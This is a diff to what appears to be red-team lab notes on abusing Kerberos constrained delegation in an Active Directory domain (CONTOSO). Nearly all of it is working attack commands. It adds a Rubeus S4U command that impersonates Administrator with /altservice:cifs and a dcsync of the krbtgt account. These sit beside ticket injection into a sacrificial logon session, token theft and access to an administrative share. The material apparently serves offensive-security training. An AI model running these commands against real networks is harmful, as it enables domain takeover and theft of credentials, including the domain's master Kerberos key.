@@ -56,6 +56,11 @@ Perform the S4U abuse to obtain a usable service ticket for **a service listed i
 execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:LON-WKSTN-1$ /msdsspn:ldap/lon-dc-1 /impersonateuser:Administrator /nowrap /ticket:
 ```
 
+With protocol transition **/altservice**
+```powershell
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:LON-WKSTN-1$ /msdsspn:ldap/lon-dc-1 /impersonateuser:Administrator /nowrap /altservice:cifs /ticket:
+```
+
  Inject the ticket into a sacrificial logon session.
 ```powershell
 execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO.COM /username:Administrator /password:FakePass /ticket:
@@ -67,4 +72,5 @@ steal_token [PID]
 run klist
 
 ls \\lon-fs-1\c$
+dcsync CONTOSO.COM CONTOSO\krbtgt
 ```
